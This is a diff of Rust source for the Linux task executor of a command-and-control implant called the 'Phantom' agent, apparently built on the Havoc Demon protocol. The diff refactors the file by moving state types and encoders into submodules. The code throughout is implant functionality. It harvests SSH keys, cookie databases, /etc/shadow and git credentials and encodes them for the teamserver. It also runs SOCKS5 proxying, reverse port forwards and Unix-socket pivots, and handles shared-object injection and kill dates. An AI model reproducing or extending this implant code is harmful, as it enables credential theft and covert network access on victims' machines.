@@ -1,6 +1,23 @@
 //! Linux task execution for the Phantom agent.
 
-use std::collections::{BTreeMap, HashMap};
+mod encode;
+mod state;
+mod types;
+
+use self::types::{
+    MEM_COMMIT, MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE, PAGE_EXECUTE, PAGE_EXECUTE_READ,
+    PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_WRITECOPY, PAGE_NOACCESS, PAGE_READONLY, PAGE_READWRITE,
+    PAGE_WRITECOPY, PIVOT_MAX_FRAME_SIZE, SOCKS_COMMAND_CONNECT, SOCKS_METHOD_NO_AUTH,
+    SOCKS_METHOD_NOT_ACCEPTABLE, SOCKS_VERSION, SocksConnectRequest, SocksRequestError,
+};
+pub(crate) use encode::encode_harvest_entries;
+pub(crate) use types::{
+    ActiveDownload, DownloadTransferState, GroupEntry, ManagedSocket, MemFile, MemoryRegion,
+    PendingCallback, PhantomState, PivotConnection, ProcessEntry, ReversePortForward,
+    ReversePortForwardMode, SessionEntry, ShareEntry, SocksProxy, UserEntry,
+};
+
+use std::collections::BTreeMap;
 use std::ffi::OsString;
 use std::fs;
 use std::io::{ErrorKind, Read, Write};
@@ -9,14 +26,12 @@ use std::os::unix::fs::MetadataExt;
 use std::os::unix::net::UnixStream;
 use std::path::{Path, PathBuf};
 use std::process::Stdio;
-use std::time::{SystemTime, UNIX_EPOCH};
 
 use red_cell_common::demon::{
-    DemonCallback, DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonKerberosCommand,
-    DemonNetCommand, DemonPackage, DemonPivotCommand, DemonProcessCommand, DemonSocketCommand,
-    DemonSocketType, DemonTransferCommand, PhantomPersistMethod, PhantomPersistOp,
+    DemonCommand, DemonConfigKey, DemonFilesystemCommand, DemonKerberosCommand, DemonNetCommand,
+    DemonPackage, DemonPivotCommand, DemonProcessCommand, DemonSocketCommand, DemonSocketType,
+    DemonTransferCommand, PhantomPersistMethod, PhantomPersistOp,
 };
-use time::OffsetDateTime;
 use tokio::net::TcpStream as TokioTcpStream;
 use tokio::process::Command;
 
@@ -25,800 +40,7 @@ use crate::error::PhantomError;
 use crate::parser::TaskParser;
 use crate::protocol::executable_name;
 
-#[derive(Debug, Clone, PartialEq, Eq)]
-pub(crate) enum PendingCallback {
-    Output { request_id: u32, text: String },
-    Error { request_id: u32, text: String },
-    Exit { request_id: u32, exit_method: u32 },
-    KillDate { request_id: u32 },
-    Structured { command_id: u32, request_id: u32, payload: Vec<u8> },
-    MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
-    FsUpload { request_id: u32, file_size: u32, path: String },
-    Socket { request_id: u32, payload: Vec<u8> },
-    FileOpen { request_id: u32, file_id: u32, file_size: u64, file_path: String },
-    FileChunk { request_id: u32, file_id: u32, data: Vec<u8> },
-    FileClose { request_id: u32, file_id: u32 },
-}
-
-#[derive(Debug, Default)]
-pub(crate) struct PhantomState {
-    mem_files: HashMap<u32, MemFile>,
-    reverse_port_forwards: HashMap<u32, ReversePortForward>,
-    socks_proxies: HashMap<u32, SocksProxy>,
-    sockets: HashMap<u32, ManagedSocket>,
-    local_relays: HashMap<u32, LocalRelayConnection>,
-    socks_clients: HashMap<u32, SocksClient>,
-    downloads: Vec<ActiveDownload>,
-    pending_callbacks: Vec<PendingCallback>,
-    /// Active SMB pivot connections keyed by child agent DemonID.
-    smb_pivots: HashMap<u32, PivotConnection>,
-    /// Kill date set dynamically by the teamserver via `CommandKillDate` or `CommandConfig`.
-    kill_date: Option<i64>,
-    /// Working-hours bitmask set dynamically by the teamserver via `CommandConfig`.
-    working_hours: Option<i32>,
-}
-
-/// An active pivot connection to a child agent via a Unix domain socket.
-#[derive(Debug)]
-struct PivotConnection {
-    /// The Unix domain socket path used for this pivot.
-    pipe_name: String,
-    /// Non-blocking Unix domain socket connected to the child agent.
-    stream: UnixStream,
-}
-
-#[derive(Debug)]
-struct MemFile {
-    expected_size: usize,
-    data: Vec<u8>,
-}
-
-#[derive(Debug)]
-struct ReversePortForward {
-    listener: TcpListener,
-    mode: ReversePortForwardMode,
-    bind_addr: u32,
-    bind_port: u32,
-    forward_addr: u32,
-    forward_port: u32,
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum ReversePortForwardMode {
-    Teamserver,
-    Local,
-}
-
-#[derive(Debug)]
-struct SocksProxy {
-    listener: TcpListener,
-    bind_addr: u32,
-    bind_port: u32,
-}
-
-#[derive(Debug)]
-struct ManagedSocket {
-    stream: TcpStream,
-    socket_type: DemonSocketType,
-    bind_addr: u32,
-    bind_port: u32,
-    forward_addr: u32,
-    forward_port: u32,
-}
-
-#[derive(Debug)]
-struct LocalRelayConnection {
-    left: TcpStream,
-    right: TcpStream,
-    parent_id: u32,
-}
-
-#[derive(Debug)]
-struct SocksClient {
-    stream: TcpStream,
-    server_id: u32,
-    state: SocksClientState,
-}
-
-#[derive(Debug)]
-enum SocksClientState {
-    Greeting { buffer: Vec<u8> },
-    Request { buffer: Vec<u8> },
-    Relay { target: TcpStream },
-}
-
-/// Default chunk size for file downloads (512 KiB).
-const DOWNLOAD_CHUNK_SIZE: usize = 512 * 1024;
-
-/// State of an active download in the agent.
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum DownloadTransferState {
-    Running = 1,
-    Stopped = 2,
-    Remove = 3,
-}
-
-/// An active file download being sent back to the teamserver in chunks.
-#[derive(Debug)]
-struct ActiveDownload {
-    file_id: u32,
-    request_id: u32,
-    file: std::fs::File,
-    total_size: u64,
-    read_size: u64,
-    state: DownloadTransferState,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-struct SocksConnectRequest {
-    atyp: u8,
-    address: Vec<u8>,
-    port: u16,
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum SocksRequestError {
-    GeneralFailure,
-    CommandNotSupported,
-    AddressTypeNotSupported,
-}
-
-#[derive(Debug)]
-struct FilesystemEntry {
-    name: String,
-    is_dir: bool,
-    size: u64,
-    modified: ModifiedTime,
-}
-
-#[derive(Debug)]
-struct FilesystemListing {
-    root_path: String,
-    entries: Vec<FilesystemEntry>,
-}
-
-#[derive(Debug)]
-struct ModifiedTime {
-    day: u32,
-    month: u32,
-    year: u32,
-    minute: u32,
-    hour: u32,
-}
-
-#[derive(Debug)]
-struct ProcessEntry {
-    name: String,
-    pid: u32,
-    parent_pid: u32,
-    session: u32,
-    threads: u32,
-    user: String,
-    is_wow64: bool,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-struct SessionEntry {
-    client: String,
-    user: String,
-    active: u32,
-    idle: u32,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-struct ShareEntry {
-    name: String,
-    path: String,
-    remark: String,
-    access: u32,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-struct GroupEntry {
-    name: String,
-    description: String,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-struct UserEntry {
-    name: String,
-    is_admin: bool,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq)]
-struct MemoryRegion {
-    base: u64,
-    size: u32,
-    protect: u32,
-    state: u32,
-    mem_type: u32,
-}
-
-const PAGE_NOACCESS: u32 = 0x01;
-const PAGE_READONLY: u32 = 0x02;
-const PAGE_READWRITE: u32 = 0x04;
-const PAGE_WRITECOPY: u32 = 0x08;
-const PAGE_EXECUTE: u32 = 0x10;
-const PAGE_EXECUTE_READ: u32 = 0x20;
-const PAGE_EXECUTE_READWRITE: u32 = 0x40;
-const PAGE_EXECUTE_WRITECOPY: u32 = 0x80;
-const MEM_COMMIT: u32 = 0x1000;
-const MEM_PRIVATE: u32 = 0x20_000;
-const MEM_MAPPED: u32 = 0x40_000;
-const MEM_IMAGE: u32 = 0x100_0000;
-const SOCKS_VERSION: u8 = 5;
-const SOCKS_METHOD_NO_AUTH: u8 = 0;
-const SOCKS_METHOD_NOT_ACCEPTABLE: u8 = 0xFF;
-const SOCKS_COMMAND_CONNECT: u8 = 1;
-const SOCKS_REPLY_SUCCEEDED: u8 = 0;
-const SOCKS_REPLY_GENERAL_FAILURE: u8 = 1;
-const SOCKS_REPLY_COMMAND_NOT_SUPPORTED: u8 = 7;
-const SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED: u8 = 8;
-
-/// Maximum number of framed messages to read per pivot per poll cycle.
-const MAX_PIVOT_READS_PER_POLL: usize = 30;
-/// Maximum allowed pivot frame size (30 MiB, matches `DEMON_MAX_RESPONSE_LENGTH`).
-const PIVOT_MAX_FRAME_SIZE: usize = 0x1E0_0000;
-
-impl PhantomState {
-    pub(crate) async fn poll(&mut self) -> Result<(), PhantomError> {
-        self.accept_reverse_port_forward_clients().await?;
-        self.accept_socks_proxy_clients()?;
-        self.poll_sockets().await?;
-        self.poll_local_relays()?;
-        self.poll_socks_clients().await?;
-        self.push_download_chunks();
-        self.poll_pivots();
-        Ok(())
-    }
-
-    pub(crate) fn drain_callbacks(&mut self) -> Vec<PendingCallback> {
-        std::mem::take(&mut self.pending_callbacks)
-    }
-
-    fn queue_callback(&mut self, callback: PendingCallback) {
-        self.pending_callbacks.push(callback);
-    }
-
-    /// Return the kill date set dynamically by the teamserver, if any.
-    pub(crate) fn kill_date(&self) -> Option<i64> {
-        self.kill_date
-    }
-
-    /// Return the working-hours bitmask set dynamically by the teamserver, if any.
-    pub(crate) fn working_hours(&self) -> Option<i32> {
-        self.working_hours
-    }
-
-    /// Set or clear the dynamic kill date (Unix timestamp in seconds).
-    #[cfg(test)]
-    pub(crate) fn set_kill_date(&mut self, kill_date: Option<i64>) {
-        self.kill_date = kill_date;
-    }
-
-    /// Set or clear the dynamic working-hours bitmask.
-    #[cfg(test)]
-    pub(crate) fn set_working_hours(&mut self, working_hours: Option<i32>) {
-        self.working_hours = working_hours;
-    }
-
-    /// Queue a `CommandKillDate` callback to notify the teamserver that
-    /// the kill date has been reached.
-    pub(crate) fn queue_kill_date_callback(&mut self) {
-        self.queue_callback(PendingCallback::KillDate { request_id: 0 });
-    }
-
-    /// Read a chunk from each running download and queue file-write callbacks.
-    ///
-    /// Downloads that have been fully read or marked for removal are cleaned up
-    /// with a file-close callback.
-    fn push_download_chunks(&mut self) {
-        let mut finished_indices = Vec::new();
-
-        for (index, download) in self.downloads.iter_mut().enumerate() {
-            if download.state == DownloadTransferState::Stopped {
-                continue;
-            }
-
-            if download.state == DownloadTransferState::Remove {
-                finished_indices.push(index);
-                continue;
-            }
-
-            let mut buf = vec![0u8; DOWNLOAD_CHUNK_SIZE];
-            let read = match Read::read(&mut download.file, &mut buf) {
-                Ok(n) => n,
-                Err(_) => {
-                    finished_indices.push(index);
-                    continue;
-                }
-            };
-
-            if read > 0 {
-                buf.truncate(read);
-                download.read_size += read as u64;
-                self.pending_callbacks.push(PendingCallback::FileChunk {
-                    request_id: download.request_id,
-                    file_id: download.file_id,
-                    data: buf,
-                });
-            }
-
-            if read == 0 || download.read_size >= download.total_size {
-                finished_indices.push(index);
-            }
-        }
-
-        // Process removals in reverse order to maintain index validity.
-        for &index in finished_indices.iter().rev() {
-            let download = self.downloads.remove(index);
-            self.pending_callbacks.push(PendingCallback::FileClose {
-                request_id: download.request_id,
-                file_id: download.file_id,
-            });
-        }
-    }
-
-    /// Poll all active pivot connections for data from child agents.
-    ///
-    /// For each pivot, reads length-framed messages from the Unix socket
-    /// (non-blocking) and wraps them in `DEMON_PIVOT_SMB_COMMAND` callbacks
-    /// for relay to the teamserver. Broken connections are automatically
-    /// removed and reported via `DEMON_PIVOT_SMB_DISCONNECT`.
-    fn poll_pivots(&mut self) {
-        let mut disconnected: Vec<u32> = Vec::new();
-
-        for (&agent_id, pivot) in &mut self.smb_pivots {
-            // Read up to MAX_PIVOT_READS_PER_POLL framed messages per pivot.
-            for _ in 0..MAX_PIVOT_READS_PER_POLL {
-                match pivot_read_frame(&pivot.stream) {
-                    Ok(Some(frame)) => {
-                        let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbCommand));
-                        payload.extend_from_slice(&encode_bytes_result(&frame));
-                        self.pending_callbacks.push(PendingCallback::Structured {
-                            command_id: u32::from(DemonCommand::CommandPivot),
-                            request_id: 0,
-                            payload,
-                        });
-                    }
-                    Ok(None) => break, // no more data available
-                    Err(_) => {
-                        disconnected.push(agent_id);
-                        break;
-                    }
-                }
-            }
-        }
-
-        for agent_id in disconnected {
-            let removed = self.smb_pivots.remove(&agent_id).is_some();
-            let mut payload = encode_u32(u32::from(DemonPivotCommand::SmbDisconnect));
-            payload.extend_from_slice(&encode_bool(removed));
-            payload.extend_from_slice(&encode_u32(agent_id));
-            self.pending_callbacks.push(PendingCallback::Structured {
-                command_id: u32::from(DemonCommand::CommandPivot),
-                request_id: 0,
-                payload,
-            });
-        }
-    }
-
-    async fn accept_reverse_port_forward_clients(&mut self) -> Result<(), PhantomError> {
-        let listener_ids = self.reverse_port_forwards.keys().copied().collect::<Vec<_>>();
-        let mut accepted = Vec::new();
-
-        for listener_id in listener_ids {
-            let Some(listener) = self.reverse_port_forwards.get(&listener_id) else {
-                continue;
-            };
-
-            loop {
-                match listener.listener.accept() {
-                    Ok((stream, _peer)) => {
-                        stream
-                            .set_nonblocking(true)
-                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
-                        accepted.push((
-                            listener_id,
-                            listener.mode,
-                            listener.bind_addr,
-                            listener.bind_port,
-                            listener.forward_addr,
-                            listener.forward_port,
-                            stream,
-                        ));
-                    }
-                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
-                    Err(error) => {
-                        return Err(PhantomError::Socket(error.to_string()));
-                    }
-                }
-            }
-        }
-
-        for (listener_id, mode, bind_addr, bind_port, forward_addr, forward_port, stream) in
-            accepted
-        {
-            match mode {
-                ReversePortForwardMode::Teamserver => {
-                    let socket_id = self.allocate_socket_id();
-                    self.sockets.insert(
-                        socket_id,
-                        ManagedSocket {
-                            stream,
-                            socket_type: DemonSocketType::Client,
-                            bind_addr,
-                            bind_port,
-                            forward_addr,
-                            forward_port,
-                        },
-                    );
-                    self.queue_callback(PendingCallback::Socket {
-                        request_id: 0,
-                        payload: encode_socket_open(
-                            socket_id,
-                            bind_addr,
-                            bind_port,
-                            forward_addr,
-                            forward_port,
-                        ),
-                    });
-
-                    if !self.reverse_port_forwards.contains_key(&listener_id) {
-                        self.remove_socket(socket_id);
-                    }
-                }
-                ReversePortForwardMode::Local => {
-                    if !self.reverse_port_forwards.contains_key(&listener_id) {
-                        continue;
-                    }
-                    if let Ok(target) = connect_ipv4_target(forward_addr, forward_port as u16).await
-                    {
-                        self.local_relays.insert(
-                            self.allocate_socket_id(),
-                            LocalRelayConnection {
-                                left: stream,
-                                right: target,
-                                parent_id: listener_id,
-                            },
-                        );
-                    }
-                }
-            }
-        }
-
-        Ok(())
-    }
-
-    fn accept_socks_proxy_clients(&mut self) -> Result<(), PhantomError> {
-        let server_ids = self.socks_proxies.keys().copied().collect::<Vec<_>>();
-        let mut accepted = Vec::new();
-
-        for server_id in server_ids {
-            let Some(proxy) = self.socks_proxies.get(&server_id) else {
-                continue;
-            };
-
-            loop {
-                match proxy.listener.accept() {
-                    Ok((stream, _peer)) => {
-                        stream
-                            .set_nonblocking(true)
-                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
-                        accepted.push((server_id, stream));
-                    }
-                    Err(error) if error.kind() == ErrorKind::WouldBlock => break,
-                    Err(error) => return Err(PhantomError::Socket(error.to_string())),
-                }
-            }
-        }
-
-        for (server_id, stream) in accepted {
-            if !self.socks_proxies.contains_key(&server_id) {
-                continue;
-            }
-            self.socks_clients.insert(
-                self.allocate_socket_id(),
-                SocksClient {
-                    stream,
-                    server_id,
-                    state: SocksClientState::Greeting { buffer: Vec::new() },
-                },
-            );
-        }
-
-        Ok(())
-    }
-
-    async fn poll_sockets(&mut self) -> Result<(), PhantomError> {
-        let socket_ids = self.sockets.keys().copied().collect::<Vec<_>>();
-        let mut removals = Vec::new();
-
-        for socket_id in socket_ids {
-            let mut read_failure = None;
-            let mut read_success = None;
-
-            {
-                let Some(socket) = self.sockets.get_mut(&socket_id) else {
-                    continue;
-                };
-
-                let mut data = Vec::new();
-                let mut buffer = [0_u8; 4096];
-
-                loop {
-                    match socket.stream.read(&mut buffer) {
-                        Ok(0) => {
-                            removals.push(socket_id);
-                            break;
-                        }
-                        Ok(read) => data.extend_from_slice(&buffer[..read]),
-                        Err(error) if error.kind() == ErrorKind::WouldBlock => break,
-                        Err(error) => {
-                            read_failure = Some(PendingCallback::Socket {
-                                request_id: 0,
-                                payload: encode_socket_read_failure(
-                                    socket_id,
-                                    socket.socket_type,
-                                    raw_socket_error(&error),
-                                ),
-                            });
-                            removals.push(socket_id);
-                            break;
-                        }
-                    }
-                }
-
-                if !data.is_empty() {
-                    read_success = Some(PendingCallback::Socket {
-                        request_id: 0,
-                        payload: encode_socket_read_success(socket_id, socket.socket_type, &data)?,
-                    });
-                }
-            }
-
-            if let Some(callback) = read_failure {
-                self.queue_callback(callback);
-            }
-            if let Some(callback) = read_success {
-                self.queue_callback(callback);
-            }
-        }
-
-        for socket_id in removals {
-            self.remove_socket(socket_id);
-        }
-
-        Ok(())
-    }
-
-    fn poll_local_relays(&mut self) -> Result<(), PhantomError> {
-        let relay_ids = self.local_relays.keys().copied().collect::<Vec<_>>();
-        let mut removals = Vec::new();
-
-        for relay_id in relay_ids {
-            let Some(relay) = self.local_relays.get_mut(&relay_id) else {
-                continue;
-            };
-
-            let left_result = pump_stream(&mut relay.left, &mut relay.right);
-            let right_result = pump_stream(&mut relay.right, &mut relay.left);
-            if left_result || right_result {
-                removals.push(relay_id);
-            }
-        }
-
-        for relay_id in removals {
-            self.local_relays.remove(&relay_id);
-        }
-
-        Ok(())
-    }
-
-    async fn poll_socks_clients(&mut self) -> Result<(), PhantomError> {
-        let client_ids = self.socks_clients.keys().copied().collect::<Vec<_>>();
-        let mut removals = Vec::new();
-
-        for client_id in client_ids {
-            let Some(client) = self.socks_clients.get_mut(&client_id) else {
-                continue;
-            };
-
-            match &mut client.state {
-                SocksClientState::Greeting { buffer } => {
-                    let closed = read_available(&mut client.stream, buffer)?;
-                    if closed {
-                        removals.push(client_id);
-                        continue;
-                    }
-
-                    match try_parse_socks_greeting(buffer) {
-                        None => {}
-                        Some(Ok(consumed)) => {
-                            let remainder = buffer.split_off(consumed);
-                            write_all_nonblocking(
-                                &mut client.stream,
-                                &[SOCKS_VERSION, SOCKS_METHOD_NO_AUTH],
-                            )
-                            .map_err(|error| PhantomError::Socket(error.to_string()))?;
-                            client.state = SocksClientState::Request { buffer: remainder };
-                        }
-                        Some(Err(method)) => {
-                            let _ =
-                                write_all_nonblocking(&mut client.stream, &[SOCKS_VERSION, method]);
-                            removals.push(client_id);
-                        }
-                    }
-                }
-                SocksClientState::Request { buffer } => {
-                    let closed = read_available(&mut client.stream, buffer)?;
-                    if closed {
-                        removals.push(client_id);
-                        continue;
-                    }
-
-                    match try_parse_socks_request(buffer) {
-                        None => {}
-                        Some(Ok((consumed, request))) => {
-                            let remainder = buffer.split_off(consumed);
-                            match connect_socks_target(request.atyp, &request.address, request.port)
-                                .await
-                            {
-                                Ok(mut target) => {
-                                    send_socks_reply(
-                                        &mut client.stream,
-                                        SOCKS_REPLY_SUCCEEDED,
-                                        request.atyp,
-                                        &request.address,
-                                        request.port,
-                                    )?;
-                                    if !remainder.is_empty() {
-                                        write_all_nonblocking(&mut target, &remainder).map_err(
-                                            |error| PhantomError::Socket(error.to_string()),
-                                        )?;
-                                    }
-                                    client.state = SocksClientState::Relay { target };
-                                }
-                                Err(_error_code) => {
-                                    send_socks_reply(
-                                        &mut client.stream,
-                                        SOCKS_REPLY_GENERAL_FAILURE,
-                                        request.atyp,
-                                        &request.address,
-                                        request.port,
-                                    )?;
-                                    removals.push(client_id);
-                                }
-                            }
-                        }
-                        Some(Err(error)) => {
-                            let reply = match error {
-                                SocksRequestError::GeneralFailure => SOCKS_REPLY_GENERAL_FAILURE,
-                                SocksRequestError::CommandNotSupported => {
-                                    SOCKS_REPLY_COMMAND_NOT_SUPPORTED
-                                }
-                                SocksRequestError::AddressTypeNotSupported => {
-                                    SOCKS_REPLY_ADDRESS_TYPE_NOT_SUPPORTED
-                                }
-                            };
-                            let _ = write_all_nonblocking(
-                                &mut client.stream,
-                                &[SOCKS_VERSION, reply, 0, 1, 0, 0, 0, 0, 0, 0],
-                            );
-                            removals.push(client_id);
-                        }
-                    }
-                }
-                SocksClientState::Relay { target } => {
-                    let client_failed = pump_stream(&mut client.stream, target);
-                    let target_failed = pump_stream(target, &mut client.stream);
-                    if client_failed || target_failed {
-                        removals.push(client_id);
-                    }
-                }
-            }
-        }
-
-        for client_id in removals {
-            self.socks_clients.remove(&client_id);
-        }
-
-        Ok(())
-    }
-
-    fn allocate_socket_id(&self) -> u32 {
-        let mut socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
-        while self.sockets.contains_key(&socket_id)
-            || self.reverse_port_forwards.contains_key(&socket_id)
-            || self.socks_proxies.contains_key(&socket_id)
-            || self.local_relays.contains_key(&socket_id)
-            || self.socks_clients.contains_key(&socket_id)
-        {
-            socket_id = (rand::random::<u32>() & 0x7FFF_FFFF) | 1;
-        }
-        socket_id
-    }
-
-    fn remove_socket(&mut self, socket_id: u32) {
-        let Some(socket) = self.sockets.remove(&socket_id) else {
-            return;
-        };
-
-        let payload = match socket.socket_type {
-            DemonSocketType::Client | DemonSocketType::ReversePortForward => {
-                encode_rportfwd_remove(
-                    socket_id,
-                    socket.socket_type,
-                    socket.bind_addr,
-                    socket.bind_port,
-                    socket.forward_addr,
-                    socket.forward_port,
-                )
-            }
-            DemonSocketType::ReverseProxy => {
-                encode_socket_close(socket_id, DemonSocketType::ReverseProxy)
-            }
-        };
-
-        self.queue_callback(PendingCallback::Socket { request_id: 0, payload });
-    }
-
-    fn remove_reverse_port_forward(&mut self, socket_id: u32) {
-        let Some(listener) = self.reverse_port_forwards.remove(&socket_id) else {
-            return;
-        };
-
-        let client_ids = self
-            .sockets
-            .iter()
-            .filter_map(|(client_id, socket)| {
-                (socket.socket_type == DemonSocketType::Client
-                    && socket.bind_addr == listener.bind_addr
-                    && socket.bind_port == listener.bind_port
-                    && socket.forward_addr == listener.forward_addr
-                    && socket.forward_port == listener.forward_port)
-                    .then_some(*client_id)
-            })
-            .collect::<Vec<_>>();
-        for client_id in client_ids {
-            self.remove_socket(client_id);
-        }
-
-        let relay_ids = self
-            .local_relays
-            .iter()
-            .filter_map(|(relay_id, relay)| (relay.parent_id == socket_id).then_some(*relay_id))
-            .collect::<Vec<_>>();
-        for relay_id in relay_ids {
-            self.local_relays.remove(&relay_id);
-        }
-
-        self.queue_callback(PendingCallback::Socket {
-            request_id: 0,
-            payload: encode_rportfwd_remove(
-                socket_id,
-                DemonSocketType::ReversePortForward,
-                listener.bind_addr,
-                listener.bind_port,
-                listener.forward_addr,
-                listener.forward_port,
-            ),
-        });
-    }
-}
-
-impl MemFile {
-    fn append(&mut self, data: &[u8]) {
-        self.data.extend_from_slice(data);
-        if self.data.len() > self.expected_size {
-            self.data.truncate(self.expected_size);
-        }
-    }
-
-    fn is_complete(&self) -> bool {
-        self.data.len() == self.expected_size
-    }
-}
+use self::encode::*;
 
 /// Execute a single Demon task package.
 pub(crate) async fn execute(
@@ -1582,13 +804,13 @@ async fn execute_harvest(request_id: u32, state: &mut PhantomState) -> Result<()
 
 /// A single harvested credential item.
 #[derive(Debug, Clone)]
-struct HarvestEntry {
+pub(crate) struct HarvestEntry {
     /// Short label: `ssh_key`, `cookie_db`, `shadow`, `credentials`.
-    kind: String,
+    pub(crate) kind: String,
     /// Absolute path the file was read from.
-    path: String,
+    pub(crate) path: String,
     /// Raw file contents.
-    data: Vec<u8>,
+    pub(crate) data: Vec<u8>,
 }
 
 /// Synchronous credential collection — run inside `spawn_blocking`.
@@ -1850,21 +1072,6 @@ fn collect_git_credential_cache_from(dir: &Path, entries: &mut Vec<HarvestEntry>
             });
         }
     }
-}
-
-/// Encode a list of harvest entries into the wire payload.
-///
-/// Format: `count(u32 LE) [ kind(len-prefixed UTF-8) path(len-prefixed UTF-8) data(len-prefixed bytes) … ]`
-fn encode_harvest_entries(entries: &[HarvestEntry]) -> Result<Vec<u8>, PhantomError> {
-    let count = u32::try_from(entries.len())
-        .map_err(|_| PhantomError::InvalidResponse("harvest entry count overflow"))?;
-    let mut payload = encode_u32(count);
-    for entry in entries {
-        payload.extend_from_slice(&encode_bytes(entry.kind.as_bytes())?);
-        payload.extend_from_slice(&encode_bytes(entry.path.as_bytes())?);
-        payload.extend_from_slice(&encode_bytes(&entry.data)?);
-    }
-    Ok(payload)
 }
 
 /// Handle `CommandScreenshot` (ID 2510): capture the Linux desktop.
@@ -3040,7 +2247,7 @@ async fn spawn_and_inject_so(so_bytes: &[u8]) -> u32 {
 
 /// Connect to a child agent's Unix domain socket, read its init packet, and
 /// return the stream, raw init data, and parsed child agent ID.
-fn pivot_connect(pipe_name: &str) -> Result<(UnixStream, Vec<u8>, u32), String> {
+pub(crate) fn pivot_connect(pipe_name: &str) -> Result<(UnixStream, Vec<u8>, u32), String> {
     let stream = UnixStream::connect(pipe_name).map_err(|e| format!("{e}"))?;
 
     // Read the child's init packet — a length-framed DemonEnvelope.
@@ -3072,7 +2279,7 @@ fn pivot_connect(pipe_name: &str) -> Result<(UnixStream, Vec<u8>, u32), String> 
 ///
 /// Returns the complete envelope including the size prefix, matching the data
 /// that the original Demon agent returns from `PivotAdd`.
-fn pivot_read_envelope_blocking(stream: &UnixStream) -> Result<Vec<u8>, std::io::Error> {
+pub(crate) fn pivot_read_envelope_blocking(stream: &UnixStream) -> Result<Vec<u8>, std::io::Error> {
     use std::io::Read as IoRead;
 
     let mut size_buf = [0u8; 4];
@@ -3099,7 +2306,7 @@ fn pivot_read_envelope_blocking(stream: &UnixStream) -> Result<Vec<u8>, std::io:
 ///
 /// Returns `Ok(Some(frame))` when a complete envelope is available,
 /// `Ok(None)` when no data is ready (WouldBlock), or `Err` on I/O failure.
-fn pivot_read_frame(stream: &UnixStream) -> Result<Option<Vec<u8>>, std::io::Error> {
+pub(crate) fn pivot_read_frame(stream: &UnixStream) -> Result<Option<Vec<u8>>, std::io::Error> {
     use std::io::Read as IoRead;
 
     let mut size_buf = [0u8; 4];
@@ -3140,7 +2347,7 @@ fn pivot_read_frame(stream: &UnixStream) -> Result<Option<Vec<u8>>, std::io::Err
 /// The data is written as-is — it is expected to already be a properly framed
 /// Demon envelope (the teamserver provides the encrypted task packet including
 /// the size prefix).
-fn pivot_write_raw(stream: &mut UnixStream, data: &[u8]) -> Result<(), std::io::Error> {
+pub(crate) fn pivot_write_raw(stream: &mut UnixStream, data: &[u8]) -> Result<(), std::io::Error> {
     use std::io::Write as IoWrite;
 
     // Temporarily blocking for the write.
@@ -3149,16 +2356,6 @@ fn pivot_write_raw(stream: &mut UnixStream, data: &[u8]) -> Result<(), std::io::
     let _ = stream.set_nonblocking(true);
 
     result
-}
-
-/// Encode bytes into the little-endian length-prefixed format (like `encode_bytes`
-/// but infallible for pivot use where the caller already holds valid data).
-fn encode_bytes_result(value: &[u8]) -> Vec<u8> {
-    let len = value.len() as u32;
-    let mut out = Vec::with_capacity(4 + value.len());
-    out.extend_from_slice(&len.to_le_bytes());
-    out.extend_from_slice(value);
-    out
 }
 
 async fn execute_filesystem(
@@ -4012,7 +3209,11 @@ fn handle_reverse_port_forward_add(
     Ok(())
 }
 
-async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStream, u32> {
+pub(crate) async fn connect_socks_target(
+    atyp: u8,
+    host: &[u8],
+    port: u16,
+) -> Result<TcpStream, u32> {
     let target = match atyp {
         1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
         3 => {
@@ -4046,12 +3247,15 @@ async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStr
     Ok(stream)
 }
 
-async fn connect_ipv4_target(addr: u32, port: u16) -> Result<TcpStream, u32> {
+pub(crate) async fn connect_ipv4_target(addr: u32, port: u16) -> Result<TcpStream, u32> {
     let octets = Ipv4Addr::from(addr).octets();
     connect_socks_target(1, &octets, port).await
 }
 
-fn read_available(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<bool, PhantomError> {
+pub(crate) fn read_available(
+    stream: &mut TcpStream,
+    buffer: &mut Vec<u8>,
+) -> Result<bool, PhantomError> {
     let mut chunk = [0_u8; 4096];
     loop {
         match stream.read(&mut chunk) {
@@ -4064,7 +3268,7 @@ fn read_available(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<bool, 
     }
 }
 
-fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
+pub(crate) fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
     let mut buffer = [0_u8; 4096];
     loop {
         match source.read(&mut buffer) {
@@ -4081,7 +3285,7 @@ fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
     }
 }
 
-fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
+pub(crate) fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
     if buffer.len() < 2 {
         return None;
     }
@@ -4098,7 +3302,7 @@ fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
     Some(Ok(total))
 }
 
-fn try_parse_socks_request(
+pub(crate) fn try_parse_socks_request(
     buffer: &[u8],
 ) -> Option<Result<(usize, SocksConnectRequest), SocksRequestError>> {
     if buffer.len() < 4 {
@@ -4137,7 +3341,7 @@ fn try_parse_socks_request(
